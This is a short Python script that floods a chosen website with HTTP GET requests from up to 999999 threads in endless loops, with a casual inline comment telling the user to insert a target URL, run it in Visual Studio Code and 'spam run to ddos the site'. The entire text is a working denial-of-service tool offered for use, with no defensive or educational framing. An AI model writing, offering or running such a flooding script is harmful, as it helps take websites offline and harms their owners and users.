our urlimport requests
import threading

def ddos_site(url):
    while True:
        try:
            requests.get(url)
        except:
            pass

if __name__ == "__main__":
    target_url = "your website" # IMPORTANT Where it says your website put your website and dont forget to add https:// or http:// before your url and put it between the quotation marks also remove this text im writing when you run the code run the code in Visual Studio Code you can also choose your amount of num threads just dont put a numbber that will make your pc explode lol when you are gonna run the code just spam run to ddos the site
     
    num_threads = 999999

    for _ in range(num_threads):
        threading.Thread(target=ddos_site, args=(target_url,)).start()
